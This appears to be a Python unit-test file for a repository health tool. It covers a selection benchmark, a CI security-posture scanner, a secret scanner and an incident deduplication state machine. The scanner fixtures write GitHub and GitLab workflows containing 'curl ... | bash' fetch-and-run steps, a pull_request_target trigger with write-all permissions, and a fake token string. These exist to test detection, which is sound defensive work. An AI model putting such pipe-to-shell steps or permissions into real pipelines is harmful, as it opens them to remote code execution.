import json
import tempfile
import unittest
from datetime import datetime, timedelta, timezone
from pathlib import Path

from scripts.benchmark_harmony import benchmark
from scripts.security_posture import automation_findings, secret_findings
from upstreamradar.health import decide_incident


class EngineeringHealthTests(unittest.TestCase):
    def test_harmony_benchmark_is_deterministic(self):
        result = benchmark(count=36, budget=24, iterations=2)
        self.assertTrue(result["deterministic"])
        self.assertEqual(len(result["selection_hash"]), 64)
        self.assertGreater(result["selected_count"], 0)
        self.assertLessEqual(result["total_cost"], 24)
        self.assertGreaterEqual(result["coverage_score"], 0.0)
        self.assertLessEqual(result["coverage_score"], 1.0)
        self.assertGreaterEqual(result["content_score"], 0.0)
        self.assertLessEqual(result["content_score"], 1.0)

    def test_security_posture_detects_high_risk_workflow_patterns(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            workflows = root / ".github" / "workflows"
            workflows.mkdir(parents=True)
            (workflows / "bad.yml").write_text(
                "on:\n"
                "  pull_request_target:\n"
                "permissions: write-all\n"
                "jobs:\n"
                "  bad:\n"
                "    steps:\n"
                "      - run: curl https://example.invalid/x | bash\n",
                encoding="utf-8",
            )
            kinds = {item["kind"] for item in automation_findings(root)}
            self.assertIn("pull_request_target", kinds)
            self.assertIn("write_all", kinds)
            self.assertIn("pipe_to_shell", kinds)

    def test_security_posture_accepts_explicit_read_only_workflow(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            workflows = root / ".github" / "workflows"
            workflows.mkdir(parents=True)
            (workflows / "good.yml").write_text(
                "name: CI\n"
                "on: [push]\n"
                "permissions:\n"
                "  contents: read\n"
                "jobs:\n"
                "  test:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - run: python -m unittest\n",
                encoding="utf-8",
            )
            high = [
                item
                for item in automation_findings(root)
                if item["severity"] in {"critical", "high"}
            ]
            self.assertEqual(high, [])

    def test_secret_scan_ignores_docs_but_flags_production_source(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            (root / "docs").mkdir()
            (root / "docs" / "example.md").write_text(
                "glpat-abcdefghijklmnopqrstuvwxyz123456",
                encoding="utf-8",
            )
            (root / "config.json").write_text(
                json.dumps(
                    {"token": "glpat-abcdefghijklmnopqrstuvwxyz123456"}
                ),
                encoding="utf-8",
            )
            findings = secret_findings(root)
            self.assertEqual(len(findings), 1)
            self.assertEqual(findings[0]["path"], str(root / "config.json"))


    def test_incident_state_machine_deduplicates_and_recovers(self):
        now = datetime(2026, 10, 1, 8, tzinfo=timezone.utc)
        evidence = {"critical": 1, "high": 0}

        first = decide_incident(
            None,
            active=True,
            evidence=evidence,
            now=now,
            cooldown_hours=12,
        )
        self.assertEqual(first.action, "create")

        record = {
            "external_id": 3,
            "status": "open",
            "fingerprint": first.fingerprint,
            "last_action_at": now.isoformat(),
        }
        unchanged = decide_incident(
            record,
            active=True,
            evidence=evidence,
            now=now + timedelta(hours=1),
            cooldown_hours=12,
        )
        self.assertEqual(unchanged.action, "none")

        changed_evidence = {"critical": 1, "high": 1}
        cooling = decide_incident(
            record,
            active=True,
            evidence=changed_evidence,
            now=now + timedelta(hours=2),
            cooldown_hours=12,
        )
        self.assertEqual(cooling.action, "none")

        updated = decide_incident(
            record,
            active=True,
            evidence=changed_evidence,
            now=now + timedelta(hours=13),
            cooldown_hours=12,
        )
        self.assertEqual(updated.action, "update")

        recovered = decide_incident(
            record,
            active=False,
            evidence={"critical": 0, "high": 0},
            now=now + timedelta(hours=14),
            cooldown_hours=12,
        )
        self.assertEqual(recovered.action, "close")

    def test_gitlab_ci_is_scanned_for_pipe_to_shell(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            (root / ".gitlab-ci.yml").write_text(
                "job:\n"
                "  script:\n"
                "    - curl https://example.invalid/x | sh\n",
                encoding="utf-8",
            )
            kinds = {item["kind"] for item in automation_findings(root)}
            self.assertIn("pipe_to_shell", kinds)


if __name__ == "__main__":
    unittest.main()
